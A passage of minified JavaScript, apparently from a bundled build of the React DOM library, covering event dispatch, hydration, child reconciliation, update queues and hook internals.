j=g,F=za(o),z=[];e:{var L=kh.get(t);if(L!==void 0){var Q=tl,Z=t;switch(t){case"keypress":if(Gs(o)===0)break e;case"keydown":case"keyup":Q=Dv;break;case"focusin":Z="focus",Q=il;break;case"focusout":Z="blur",Q=il;break;case"beforeblur":case"afterblur":Q=il;break;case"click":if(o.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":Q=Yd;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":Q=wv;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":Q=Mv;break;case yh:case bh:case vh:Q=Sv;break;case wh:Q=Nv;break;case"scroll":Q=bv;break;case"wheel":Q=Fv;break;case"copy":case"cut":case"paste":Q=Av;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":Q=Zd}var te=(i&4)!==0,ze=!te&&t==="scroll",D=te?L!==null?L+"Capture":null:L;te=[];for(var R=j,O;R!==null;){O=R;var $=O.stateNode;if(O.tag===5&&$!==null&&(O=$,D!==null&&($=Si(R,D),$!=null&&te.push(Vi(R,$,O)))),ze)break;R=R.return}0<te.length&&(L=new Q(L,Z,null,o,F),z.push({event:L,listeners:te}))}}if((i&7)===0){e:{if(L=t==="mouseover"||t==="pointerover",Q=t==="mouseout"||t==="pointerout",L&&o!==Ua&&(Z=o.relatedTarget||o.fromElement)&&(Qn(Z)||Z[rn]))break e;if((Q||L)&&(L=F.window===F?F:(L=F.ownerDocument)?L.defaultView||L.parentWindow:window,Q?(Z=o.relatedTarget||o.toElement,Q=j,Z=Z?Qn(Z):null,Z!==null&&(ze=Jn(Z),Z!==ze||Z.tag!==5&&Z.tag!==6)&&(Z=null)):(Q=null,Z=j),Q!==Z)){if(te=Yd,$="onMouseLeave",D="onMouseEnter",R="mouse",(t==="pointerout"||t==="pointerover")&&(te=Zd,$="onPointerLeave",D="onPointerEnter",R="pointer"),ze=Q==null?L:Nr(Q),O=Z==null?L:Nr(Z),L=new te($,R+"leave",Q,o,F),L.target=ze,L.relatedTarget=O,$=null,Qn(F)===j&&(te=new te(D,R+"enter",Z,o,F),te.target=O,te.relatedTarget=ze,$=te),ze=$,Q&&Z)t:{for(te=Q,D=Z,R=0,O=te;O;O=Mr(O))R++;for(O=0,$=D;$;$=Mr($))O++;for(;0<R-O;)te=Mr(te),R--;for(;0<O-R;)D=Mr(D),O--;for(;R--;){if(te===D||D!==null&&te===D.alternate)break t;te=Mr(te),D=Mr(D)}te=null}else te=null;Q!==null&&Ch(z,L,Q,te,!1),Z!==null&&ze!==null&&Ch(z,ze,Z,te,!0)}}e:{if(L=j?Nr(j):window,Q=L.nodeName&&L.nodeName.toLowerCase(),Q==="select"||Q==="input"&&L.type==="file")var re=qv;else if(sh(L))if(ah)re=Qv;else{re=Kv;var ie=Gv}else(Q=L.nodeName)&&Q.toLowerCase()==="input"&&(L.type==="checkbox"||L.type==="radio")&&(re=Jv);if(re&&(re=re(t,j))){oh(z,re,o,F);break e}ie&&ie(t,L,j),t==="focusout"&&(ie=L._wrapperState)&&ie.controlled&&L.type==="number"&&Ma(L,"number",L.value)}switch(ie=j?Nr(j):window,t){case"focusin":(sh(ie)||ie.contentEditable==="true")&&(Or=ie,ul=j,Fi=null);break;case"focusout":Fi=ul=Or=null;break;case"mousedown":dl=!0;break;case"contextmenu":case"mouseup":case"dragend":dl=!1,gh(z,o,F);break;case"selectionchange":if(Zv)break;case"keydown":case"keyup":gh(z,o,F)}var se;if(ol)e:{switch(t){case"compositionstart":var ue="onCompositionStart";break e;case"compositionend":ue="onCompositionEnd";break e;case"compositionupdate":ue="onCompositionUpdate";break e}ue=void 0}else Dr?rh(t,o)&&(ue="onCompositionEnd"):t==="keydown"&&o.keyCode===229&&(ue="onCompositionStart");ue&&(eh&&o.locale!=="ko"&&(Dr||ue!=="onCompositionStart"?ue==="onCompositionEnd"&&Dr&&(se=Jd()):(xn=F,el="value"in xn?xn.value:xn.textContent,Dr=!0)),ie=eo(j,ue),0<ie.length&&(ue=new Xd(ue,t,null,o,F),z.push({event:ue,listeners:ie}),se?ue.data=se:(se=ih(o),se!==null&&(ue.data=se)))),(se=zv?Vv(t,o):Wv(t,o))&&(j=eo(j,"onBeforeInput"),0<j.length&&(F=new Xd("onBeforeInput","beforeinput",null,o,F),z.push({event:F,listeners:j}),F.data=se))}Th(z,i)})}function Vi(t,i,o){return{instance:t,listener:i,currentTarget:o}}function eo(t,i){for(var o=i+"Capture",u=[];t!==null;){var h=t,g=h.stateNode;h.tag===5&&g!==null&&(h=g,g=Si(t,o),g!=null&&u.unshift(Vi(t,g,h)),g=Si(t,i),g!=null&&u.push(Vi(t,g,h))),t=t.return}return u}function Mr(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function Ch(t,i,o,u,h){for(var g=i._reactName,b=[];o!==null&&o!==u;){var S=o,E=S.alternate,j=S.stateNode;if(E!==null&&E===u)break;S.tag===5&&j!==null&&(S=j,h?(E=Si(o,g),E!=null&&b.unshift(Vi(o,E,S))):h||(E=Si(o,g),E!=null&&b.push(Vi(o,E,S)))),o=o.return}b.length!==0&&t.push({event:i,listeners:b})}var rw=/\r\n?/g,iw=/\u0000|\uFFFD/g;function Eh(t){return(typeof t=="string"?t:""+t).replace(rw,`
`).replace(iw,"")}function to(t,i,o){if(i=Eh(i),Eh(t)!==i&&o)throw Error(r(425))}function no(){}var yl=null,bl=null;function vl(t,i){return t==="textarea"||t==="noscript"||typeof i.children=="string"||typeof i.children=="number"||typeof i.dangerouslySetInnerHTML=="object"&&i.dangerouslySetInnerHTML!==null&&i.dangerouslySetInnerHTML.__html!=null}var wl=typeof setTimeout=="function"?setTimeout:void 0,sw=typeof clearTimeout=="function"?clearTimeout:void 0,Ph=typeof Promise=="function"?Promise:void 0,ow=typeof queueMicrotask=="function"?queueMicrotask:typeof Ph<"u"?function(t){return Ph.resolve(null).then(t).catch(aw)}:wl;function aw(t){setTimeout(function(){throw t})}function kl(t,i){var o=i,u=0;do{var h=o.nextSibling;if(t.removeChild(o),h&&h.nodeType===8)if(o=h.data,o==="/$"){if(u===0){t.removeChild(h),Di(i);return}u--}else o!=="$"&&o!=="$?"&&o!=="$!"||u++;o=h}while(o);Di(i)}function Tn(t){for(;t!=null;t=t.nextSibling){var i=t.nodeType;if(i===1||i===3)break;if(i===8){if(i=t.data,i==="$"||i==="$!"||i==="$?")break;if(i==="/$")return null}}return t}function _h(t){t=t.previousSibling;for(var i=0;t;){if(t.nodeType===8){var o=t.data;if(o==="$"||o==="$!"||o==="$?"){if(i===0)return t;i--}else o==="/$"&&i++}t=t.previousSibling}return null}var Br=Math.random().toString(36).slice(2),Qt="__reactFiber$"+Br,Wi="__reactProps$"+Br,rn="__reactContainer$"+Br,xl="__reactEvents$"+Br,lw="__reactListeners$"+Br,cw="__reactHandles$"+Br;function Qn(t){var i=t[Qt];if(i)return i;for(var o=t.parentNode;o;){if(i=o[rn]||o[Qt]){if(o=i.alternate,i.child!==null||o!==null&&o.child!==null)for(t=_h(t);t!==null;){if(o=t[Qt])return o;t=_h(t)}return i}t=o,o=t.parentNode}return null}function $i(t){return t=t[Qt]||t[rn],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function Nr(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(r(33))}function ro(t){return t[Wi]||null}var Sl=[],Lr=-1;function An(t){return{current:t}}function De(t){0>Lr||(t.current=Sl[Lr],Sl[Lr]=null,Lr--)}function Pe(t,i){Lr++,Sl[Lr]=t.current,t.current=i}var Cn={},st=An(Cn),pt=An(!1),Yn=Cn;function Fr(t,i){var o=t.type.contextTypes;if(!o)return Cn;var u=t.stateNode;if(u&&u.__reactInternalMemoizedUnmaskedChildContext===i)return u.__reactInternalMemoizedMaskedChildContext;var h={},g;for(g in o)h[g]=i[g];return u&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=i,t.__reactInternalMemoizedMaskedChildContext=h),h}function ft(t){return t=t.childContextTypes,t!=null}function io(){De(pt),De(st)}function Ih(t,i,o){if(st.current!==Cn)throw Error(r(168));Pe(st,i),Pe(pt,o)}function Rh(t,i,o){var u=t.stateNode;if(i=i.childContextTypes,typeof u.getChildContext!="function")return o;u=u.getChildContext();for(var h in u)if(!(h in i))throw Error(r(108,Se(t)||"Unknown",h));return J({},o,u)}function so(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||Cn,Yn=st.current,Pe(st,t),Pe(pt,pt.current),!0}function Dh(t,i,o){var u=t.stateNode;if(!u)throw Error(r(169));o?(t=Rh(t,i,Yn),u.__reactInternalMemoizedMergedChildContext=t,De(pt),De(st),Pe(st,t)):De(pt),Pe(pt,o)}var sn=null,oo=!1,Tl=!1;function Oh(t){sn===null?sn=[t]:sn.push(t)}function uw(t){oo=!0,Oh(t)}function En(){if(!Tl&&sn!==null){Tl=!0;var t=0,i=Te;try{var o=sn;for(Te=1;t<o.length;t++){var u=o[t];do u=u(!0);while(u!==null)}sn=null,oo=!1}catch(h){throw sn!==null&&(sn=sn.slice(t+1)),Md(qa,En),h}finally{Te=i,Tl=!1}}return null}var Ur=[],zr=0,ao=null,lo=0,It=[],Rt=0,Xn=null,on=1,an="";function Zn(t,i){Ur[zr++]=lo,Ur[zr++]=ao,ao=t,lo=i}function jh(t,i,o){It[Rt++]=on,It[Rt++]=an,It[Rt++]=Xn,Xn=t;var u=on;t=an;var h=32-Lt(u)-1;u&=~(1<<h),o+=1;var g=32-Lt(i)+h;if(30<g){var b=h-h%5;g=(u&(1<<b)-1).toString(32),u>>=b,h-=b,on=1<<32-Lt(i)+h|o<<h|u,an=g+t}else on=1<<g|o<<h|u,an=t}function Al(t){t.return!==null&&(Zn(t,1),jh(t,1,0))}function Cl(t){for(;t===ao;)ao=Ur[--zr],Ur[zr]=null,lo=Ur[--zr],Ur[zr]=null;for(;t===Xn;)Xn=It[--Rt],It[Rt]=null,an=It[--Rt],It[Rt]=null,on=It[--Rt],It[Rt]=null}var St=null,Tt=null,je=!1,Ut=null;function Mh(t,i){var o=Mt(5,null,null,0);o.elementType="DELETED",o.stateNode=i,o.return=t,i=t.deletions,i===null?(t.deletions=[o],t.flags|=16):i.push(o)}function Bh(t,i){switch(t.tag){case 5:var o=t.type;return i=i.nodeType!==1||o.toLowerCase()!==i.nodeName.toLowerCase()?null:i,i!==null?(t.stateNode=i,St=t,Tt=Tn(i.firstChild),!0):!1;case 6:return i=t.pendingProps===""||i.nodeType!==3?null:i,i!==null?(t.stateNode=i,St=t,Tt=null,!0):!1;case 13:return i=i.nodeType!==8?null:i,i!==null?(o=Xn!==null?{id:on,overflow:an}:null,t.memoizedState={dehydrated:i,treeContext:o,retryLane:1073741824},o=Mt(18,null,null,0),o.stateNode=i,o.return=t,t.child=o,St=t,Tt=null,!0):!1;default:return!1}}function El(t){return(t.mode&1)!==0&&(t.flags&128)===0}function Pl(t){if(je){var i=Tt;if(i){var o=i;if(!Bh(t,i)){if(El(t))throw Error(r(418));i=Tn(o.nextSibling);var u=St;i&&Bh(t,i)?Mh(u,o):(t.flags=t.flags&-4097|2,je=!1,St=t)}}else{if(El(t))throw Error(r(418));t.flags=t.flags&-4097|2,je=!1,St=t}}}function Nh(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;St=t}function co(t){if(t!==St)return!1;if(!je)return Nh(t),je=!0,!1;var i;if((i=t.tag!==3)&&!(i=t.tag!==5)&&(i=t.type,i=i!=="head"&&i!=="body"&&!vl(t.type,t.memoizedProps)),i&&(i=Tt)){if(El(t))throw Lh(),Error(r(418));for(;i;)Mh(t,i),i=Tn(i.nextSibling)}if(Nh(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(r(317));e:{for(t=t.nextSibling,i=0;t;){if(t.nodeType===8){var o=t.data;if(o==="/$"){if(i===0){Tt=Tn(t.nextSibling);break e}i--}else o!=="$"&&o!=="$!"&&o!=="$?"||i++}t=t.nextSibling}Tt=null}}else Tt=St?Tn(t.stateNode.nextSibling):null;return!0}function Lh(){for(var t=Tt;t;)t=Tn(t.nextSibling)}function Vr(){Tt=St=null,je=!1}function _l(t){Ut===null?Ut=[t]:Ut.push(t)}var dw=M.ReactCurrentBatchConfig;function Hi(t,i,o){if(t=o.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(o._owner){if(o=o._owner,o){if(o.tag!==1)throw Error(r(309));var u=o.stateNode}if(!u)throw Error(r(147,t));var h=u,g=""+t;return i!==null&&i.ref!==null&&typeof i.ref=="function"&&i.ref._stringRef===g?i.ref:(i=function(b){var S=h.refs;b===null?delete S[g]:S[g]=b},i._stringRef=g,i)}if(typeof t!="string")throw Error(r(284));if(!o._owner)throw Error(r(290,t))}return t}function uo(t,i){throw t=Object.prototype.toString.call(i),Error(r(31,t==="[object Object]"?"object with keys {"+Object.keys(i).join(", ")+"}":t))}function Fh(t){var i=t._init;return i(t._payload)}function Uh(t){function i(D,R){if(t){var O=D.deletions;O===null?(D.deletions=[R],D.flags|=16):O.push(R)}}function o(D,R){if(!t)return null;for(;R!==null;)i(D,R),R=R.sibling;return null}function u(D,R){for(D=new Map;R!==null;)R.key!==null?D.set(R.key,R):D.set(R.index,R),R=R.sibling;return D}function h(D,R){return D=Mn(D,R),D.index=0,D.sibling=null,D}function g(D,R,O){return D.index=O,t?(O=D.alternate,O!==null?(O=O.index,O<R?(D.flags|=2,R):O):(D.flags|=2,R)):(D.flags|=1048576,R)}function b(D){return t&&D.alternate===null&&(D.flags|=2),D}function S(D,R,O,$){return R===null||R.tag!==6?(R=wc(O,D.mode,$),R.return=D,R):(R=h(R,O),R.return=D,R)}function E(D,R,O,$){var re=O.type;return re===W?F(D,R,O.props.children,$,O.key):R!==null&&(R.elementType===re||typeof re=="object"&&re!==null&&re.$$typeof===ae&&Fh(re)===R.type)?($=h(R,O.props),$.ref=Hi(D,R,O),$.return=D,$):($=Mo(O.type,O.key,O.props,null,D.mode,$),$.ref=Hi(D,R,O),$.return=D,$)}function j(D,R,O,$){return R===null||R.tag!==4||R.stateNode.containerInfo!==O.containerInfo||R.stateNode.implementation!==O.implementation?(R=kc(O,D.mode,$),R.return=D,R):(R=h(R,O.children||[]),R.return=D,R)}function F(D,R,O,$,re){return R===null||R.tag!==7?(R=ar(O,D.mode,$,re),R.return=D,R):(R=h(R,O),R.return=D,R)}function z(D,R,O){if(typeof R=="string"&&R!==""||typeof R=="number")return R=wc(""+R,D.mode,O),R.return=D,R;if(typeof R=="object"&&R!==null){switch(R.$$typeof){case V:return O=Mo(R.type,R.key,R.props,null,D.mode,O),O.ref=Hi(D,null,R),O.return=D,O;case U:return R=kc(R,D.mode,O),R.return=D,R;case ae:var $=R._init;return z(D,$(R._payload),O)}if(wi(R)||Y(R))return R=ar(R,D.mode,O,null),R.return=D,R;uo(D,R)}return null}function L(D,R,O,$){var re=R!==null?R.key:null;if(typeof O=="string"&&O!==""||typeof O=="number")return re!==null?null:S(D,R,""+O,$);if(typeof O=="object"&&O!==null){switch(O.$$typeof){case V:return O.key===re?E(D,R,O,$):null;case U:return O.key===re?j(D,R,O,$):null;case ae:return re=O._init,L(D,R,re(O._payload),$)}if(wi(O)||Y(O))return re!==null?null:F(D,R,O,$,null);uo(D,O)}return null}function Q(D,R,O,$,re){if(typeof $=="string"&&$!==""||typeof $=="number")return D=D.get(O)||null,S(R,D,""+$,re);if(typeof $=="object"&&$!==null){switch($.$$typeof){case V:return D=D.get($.key===null?O:$.key)||null,E(R,D,$,re);case U:return D=D.get($.key===null?O:$.key)||null,j(R,D,$,re);case ae:var ie=$._init;return Q(D,R,O,ie($._payload),re)}if(wi($)||Y($))return D=D.get(O)||null,F(R,D,$,re,null);uo(R,$)}return null}function Z(D,R,O,$){for(var re=null,ie=null,se=R,ue=R=0,et=null;se!==null&&ue<O.length;ue++){se.index>ue?(et=se,se=null):et=se.sibling;var ke=L(D,se,O[ue],$);if(ke===null){se===null&&(se=et);break}t&&se&&ke.alternate===null&&i(D,se),R=g(ke,R,ue),ie===null?re=ke:ie.sibling=ke,ie=ke,se=et}if(ue===O.length)return o(D,se),je&&Zn(D,ue),re;if(se===null){for(;ue<O.length;ue++)se=z(D,O[ue],$),se!==null&&(R=g(se,R,ue),ie===null?re=se:ie.sibling=se,ie=se);return je&&Zn(D,ue),re}for(se=u(D,se);ue<O.length;ue++)et=Q(se,D,ue,O[ue],$),et!==null&&(t&&et.alternate!==null&&se.delete(et.key===null?ue:et.key),R=g(et,R,ue),ie===null?re=et:ie.sibling=et,ie=et);return t&&se.forEach(function(Bn){return i(D,Bn)}),je&&Zn(D,ue),re}function te(D,R,O,$){var re=Y(O);if(typeof re!="function")throw Error(r(150));if(O=re.call(O),O==null)throw Error(r(151));for(var ie=re=null,se=R,ue=R=0,et=null,ke=O.next();se!==null&&!ke.done;ue++,ke=O.next()){se.index>ue?(et=se,se=null):et=se.sibling;var Bn=L(D,se,ke.value,$);if(Bn===null){se===null&&(se=et);break}t&&se&&Bn.alternate===null&&i(D,se),R=g(Bn,R,ue),ie===null?re=Bn:ie.sibling=Bn,ie=Bn,se=et}if(ke.done)return o(D,se),je&&Zn(D,ue),re;if(se===null){for(;!ke.done;ue++,ke=O.next())ke=z(D,ke.value,$),ke!==null&&(R=g(ke,R,ue),ie===null?re=ke:ie.sibling=ke,ie=ke);return je&&Zn(D,ue),re}for(se=u(D,se);!ke.done;ue++,ke=O.next())ke=Q(se,D,ue,ke.value,$),ke!==null&&(t&&ke.alternate!==null&&se.delete(ke.key===null?ue:ke.key),R=g(ke,R,ue),ie===null?re=ke:ie.sibling=ke,ie=ke);return t&&se.forEach(function($w){return i(D,$w)}),je&&Zn(D,ue),re}function ze(D,R,O,$){if(typeof O=="object"&&O!==null&&O.type===W&&O.key===null&&(O=O.props.children),typeof O=="object"&&O!==null){switch(O.$$typeof){case V:e:{for(var re=O.key,ie=R;ie!==null;){if(ie.key===re){if(re=O.type,re===W){if(ie.tag===7){o(D,ie.sibling),R=h(ie,O.props.children),R.return=D,D=R;break e}}else if(ie.elementType===re||typeof re=="object"&&re!==null&&re.$$typeof===ae&&Fh(re)===ie.type){o(D,ie.sibling),R=h(ie,O.props),R.ref=Hi(D,ie,O),R.return=D,D=R;break e}o(D,ie);break}else i(D,ie);ie=ie.sibling}O.type===W?(R=ar(O.props.children,D.mode,$,O.key),R.return=D,D=R):($=Mo(O.type,O.key,O.props,null,D.mode,$),$.ref=Hi(D,R,O),$.return=D,D=$)}return b(D);case U:e:{for(ie=O.key;R!==null;){if(R.key===ie)if(R.tag===4&&R.stateNode.containerInfo===O.containerInfo&&R.stateNode.implementation===O.implementation){o(D,R.sibling),R=h(R,O.children||[]),R.return=D,D=R;break e}else{o(D,R);break}else i(D,R);R=R.sibling}R=kc(O,D.mode,$),R.return=D,D=R}return b(D);case ae:return ie=O._init,ze(D,R,ie(O._payload),$)}if(wi(O))return Z(D,R,O,$);if(Y(O))return te(D,R,O,$);uo(D,O)}return typeof O=="string"&&O!==""||typeof O=="number"?(O=""+O,R!==null&&R.tag===6?(o(D,R.sibling),R=h(R,O),R.return=D,D=R):(o(D,R),R=wc(O,D.mode,$),R.return=D,D=R),b(D)):o(D,R)}return ze}var Wr=Uh(!0),zh=Uh(!1),ho=An(null),po=null,$r=null,Il=null;function Rl(){Il=$r=po=null}function Dl(t){var i=ho.current;De(ho),t._currentValue=i}function Ol(t,i,o){for(;t!==null;){var u=t.alternate;if((t.childLanes&i)!==i?(t.childLanes|=i,u!==null&&(u.childLanes|=i)):u!==null&&(u.childLanes&i)!==i&&(u.childLanes|=i),t===o)break;t=t.return}}function Hr(t,i){po=t,Il=$r=null,t=t.dependencies,t!==null&&t.firstContext!==null&&((t.lanes&i)!==0&&(gt=!0),t.firstContext=null)}function Dt(t){var i=t._currentValue;if(Il!==t)if(t={context:t,memoizedValue:i,next:null},$r===null){if(po===null)throw Error(r(308));$r=t,po.dependencies={lanes:0,firstContext:t}}else $r=$r.next=t;return i}var er=null;function jl(t){er===null?er=[t]:er.push(t)}function Vh(t,i,o,u){var h=i.interleaved;return h===null?(o.next=o,jl(i)):(o.next=h.next,h.next=o),i.interleaved=o,ln(t,u)}function ln(t,i){t.lanes|=i;var o=t.alternate;for(o!==null&&(o.lanes|=i),o=t,t=t.return;t!==null;)t.childLanes|=i,o=t.alternate,o!==null&&(o.childLanes|=i),o=t,t=t.return;return o.tag===3?o.stateNode:null}var Pn=!1;function Ml(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Wh(t,i){t=t.updateQueue,i.updateQueue===t&&(i.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function cn(t,i){return{eventTime:t,lane:i,tag:0,payload:null,callback:null,next:null}}function _n(t,i,o){var u=t.updateQueue;if(u===null)return null;if(u=u.shared,(we&2)!==0){var h=u.pending;return h===null?i.next=i:(i.next=h.next,h.next=i),u.pending=i,ln(t,o)}return h=u.interleaved,h===null?(i.next=i,jl(u)):(i.next=h.next,h.next=i),u.interleaved=i,ln(t,o)}function fo(t,i,o){if(i=i.updateQueue,i!==null&&(i=i.shared,(o&4194240)!==0)){var u=i.lanes;u&=t.pendingLanes,o|=u,i.lanes=o,Ja(t,o)}}function $h(t,i){var o=t.updateQueue,u=t.alternate;if(u!==null&&(u=u.updateQueue,o===u)){var h=null,g=null;if(o=o.firstBaseUpdate,o!==null){do{var b={eventTime:o.eventTime,lane:o.lane,tag:o.tag,payload:o.payload,callback:o.callback,next:null};g===null?h=g=b:g=g.next=b,o=o.next}while(o!==null);g===null?h=g=i:g=g.next=i}else h=g=i;o={baseState:u.baseState,firstBaseUpdate:h,lastBaseUpdate:g,shared:u.shared,effects:u.effects},t.updateQueue=o;return}t=o.lastBaseUpdate,t===null?o.firstBaseUpdate=i:t.next=i,o.lastBaseUpdate=i}function go(t,i,o,u){var h=t.updateQueue;Pn=!1;var g=h.firstBaseUpdate,b=h.lastBaseUpdate,S=h.shared.pending;if(S!==null){h.shared.pending=null;var E=S,j=E.next;E.next=null,b===null?g=j:b.next=j,b=E;var F=t.alternate;F!==null&&(F=F.updateQueue,S=F.lastBaseUpdate,S!==b&&(S===null?F.firstBaseUpdate=j:S.next=j,F.lastBaseUpdate=E))}if(g!==null){var z=h.baseState;b=0,F=j=E=null,S=g;do{var L=S.lane,Q=S.eventTime;if((u&L)===L){F!==null&&(F=F.next={eventTime:Q,lane:0,tag:S.tag,payload:S.payload,callback:S.callback,next:null});e:{var Z=t,te=S;switch(L=i,Q=o,te.tag){case 1:if(Z=te.payload,typeof Z=="function"){z=Z.call(Q,z,L);break e}z=Z;break e;case 3:Z.flags=Z.flags&-65537|128;case 0:if(Z=te.payload,L=typeof Z=="function"?Z.call(Q,z,L):Z,L==null)break e;z=J({},z,L);break e;case 2:Pn=!0}}S.callback!==null&&S.lane!==0&&(t.flags|=64,L=h.effects,L===null?h.effects=[S]:L.push(S))}else Q={eventTime:Q,lane:L,tag:S.tag,payload:S.payload,callback:S.callback,next:null},F===null?(j=F=Q,E=z):F=F.next=Q,b|=L;if(S=S.next,S===null){if(S=h.shared.pending,S===null)break;L=S,S=L.next,L.next=null,h.lastBaseUpdate=L,h.shared.pending=null}}while(!0);if(F===null&&(E=z),h.baseState=E,h.firstBaseUpdate=j,h.lastBaseUpdate=F,i=h.shared.interleaved,i!==null){h=i;do b|=h.lane,h=h.next;while(h!==i)}else g===null&&(h.shared.lanes=0);rr|=b,t.lanes=b,t.memoizedState=z}}function Hh(t,i,o){if(t=i.effects,i.effects=null,t!==null)for(i=0;i<t.length;i++){var u=t[i],h=u.callback;if(h!==null){if(u.callback=null,u=o,typeof h!="function")throw Error(r(191,h));h.call(u)}}}var qi={},Yt=An(qi),Gi=An(qi),Ki=An(qi);function tr(t){if(t===qi)throw Error(r(174));return t}function Bl(t,i){switch(Pe(Ki,i),Pe(Gi,t),Pe(Yt,qi),t=i.nodeType,t){case 9:case 11:i=(i=i.documentElement)?i.namespaceURI:Na(null,"");break;default:t=t===8?i.parentNode:i,i=t.namespaceURI||null,t=t.tagName,i=Na(i,t)}De(Yt),Pe(Yt,i)}function qr(){De(Yt),De(Gi),De(Ki)}function qh(t){tr(Ki.current);var i=tr(Yt.current),o=Na(i,t.type);i!==o&&(Pe(Gi,t),Pe(Yt,o))}function Nl(t){Gi.current===t&&(De(Yt),De(Gi))}var Me=An(0);function mo(t){for(var i=t;i!==null;){if(i.tag===13){var o=i.memoizedState;if(o!==null&&(o=o.dehydrated,o===null||o.data==="$?"||o.data==="$!"))return i}else if(i.tag===19&&i.memoizedProps.revealOrder!==void 0){if((i.flags&128)!==0)return i}else if(i.child!==null){i.child.return=i,i=i.child;continue}if(i===t)break;for(;i.sibling===null;){if(i.return===null||i.return===t)return null;i=i.return}i.sibling.return=i.return,i=i.sibling}return null}var Ll=[];function Fl(){for(var t=0;t<Ll.length;t++)Ll[t]._workInProgressVersionPrimary=null;Ll.length=0}var yo=M.ReactCurrentDispatcher,Ul=M.ReactCurrentBatchConfig,nr=0,Be=null,Ge=null,Xe=null,bo=!1,Ji=!1,Qi=0,hw=0;function ot(){throw Error(r(321))}function zl(t,i){if(i===null)return!1;for(var o=0;o<i.length&&o<t.length;o++)if(!Ft(t[o],i[o]))return!1;return!0}function Vl(t,i,o,u,h,g){if(nr=g,Be=i,i.memoizedState=null,i.updateQueue=null,i.lanes=0,yo.current=t===null||t.memoizedState===null?mw:yw,t=o(u,h),Ji){g=0;do{if(Ji=!1,Qi=0,25<=g)throw Error(r(301));g+=1,Xe=Ge=null,i.updateQueue=null,yo.current=bw,t=o(u,h)}while(Ji)}if(yo.current=ko,i=Ge!==null&&Ge.next!==null,nr=0,Xe=Ge=Be=null,bo=!1,i)throw Error(r(300));return t}function Wl(){var t=Qi!==0;return Qi=0,t}function Xt(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Xe===null?Be.memoizedState=Xe=t:Xe=Xe.next=t,Xe}function Ot(){if(Ge===null){var t=Be.alternate;t=t!==null?t.memoizedState:null}else t=Ge.next;var i=Xe===null?Be.memoizedState:Xe.next;if(i!==null)Xe=i,Ge=t;else{if(t===null)throw Error(r(310));Ge=t,t={memoizedState:Ge.memoizedState,baseState:Ge.baseState,baseQueue:Ge.baseQueue,queue:Ge.queue,next:null},Xe===null?Be.memoizedState=Xe=t:Xe=Xe.next=t}return Xe}function Yi(t,i){return typeof i=="function"?i(t):i}function $l(t){var i=Ot(),o=i.queue;if(o===null)throw Error(r(311));o.lastRenderedReducer=t;var u=Ge,h=u.baseQueue,g=o.pending;if(g!==null){if(h!==null){var b=h.next;h.next=g.next,g.next=b}u.baseQueue=h=g,o.pending=null}if(h!==null){g=h.next,u=u.baseState;var S=b=null,E=null,j=g;do{var F=j.lane;if((nr&F)===F)E!==null&&(E=E.next={lane:0,action:j.action,hasEagerState:j.hasEagerState,eagerState:j.eagerState,next:null}),u=j.hasEagerState?j.eagerState:t(u,j.action);else{var z={lane:F,action:j.action,hasEagerState:j.hasEagerState,eagerState:j.eagerState,next:null};E===null?(S=E=z,b=u):E=E.next=z,Be.lanes|=F,rr|=F}j=j.next}while(j!==null&&j!==g);E===null?b=u:E.next=S,Ft(u,i.memoizedState)||(gt=!0),i.memoizedState=u,i.baseState=b,i.baseQueue=E,o.lastRenderedState=u}if(t=o.interleaved,t!==null){h=t;do g=h.lane,Be.lanes|=g,rr|=g,h=h.next;while(h!==t)}else h===null&&(o.lanes=0);return[i.memoizedState,o.dispatch]}function Hl(t){var i=Ot(),o=i.queue;if(o===null)throw Error(r(311));o.lastRenderedReducer=t;var u=o.dispatch,h=o.pending,g=i.memoizedState;if(h!==null){o.pending=null;var b=h=h.next;do g=t(g,b.action),b=b.next;while(b!==h);Ft(g,i.memoizedState)||(gt=!0),i.memoizedState=g,i.baseQueue===null&&(i.baseState=g),o.lastRenderedState=g}return[g,u]}function Gh(){}function Kh(t,i){var o=Be,u=Ot(),h=i(),g=!Ft(u.memoizedState,h);if(g&&(u.memoizedState=h,gt=!0),u=u.queue,ql(Yh.bind(null,o,u,t),[t]),u.getSnapshot!==i||g||Xe!==null&&Xe.memoizedState.tag&1){if(o.flags|=2048,Xi(9,Qh.bind(null,o,u,h,i),void 0,null),Ze===null)throw Error(r(349));(nr&30)!==0||Jh(o,i,h)}return h}function Jh(t,i,o){t.flags|=16384,t={getSnapshot:i,value:o},i=Be.updateQueue,i===null?(i={lastEffect:null,stores:null},Be.updateQueue=i,i.stores=[t]):(o=i.stores,o===null?i.stores=[t]:o.push(t))}function Qh(t,i,o,u){i.value=o,i.getSnapshot=u,Xh(i)&&Zh(t)}function Yh(t,i,o){return o(function(){Xh(i)&&Zh(t)})}function Xh(t){var i=t.getSnapshot;t=t.value;try{var o=i();return!Ft(t,o)}catch{return!0}}function Zh(t){var i=ln(t,1);i!==null&&$t(i,t,1,-1)}function ep(t){var i=Xt();return typeof t=="function"&&(t=t()),i.memoizedState=i.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Yi,lastRenderedState:t},i.queue=t,t=t.dispatch=gw.bind(null,Be,t),[i.memoizedState,t]}function Xi(t,i,o,u){return 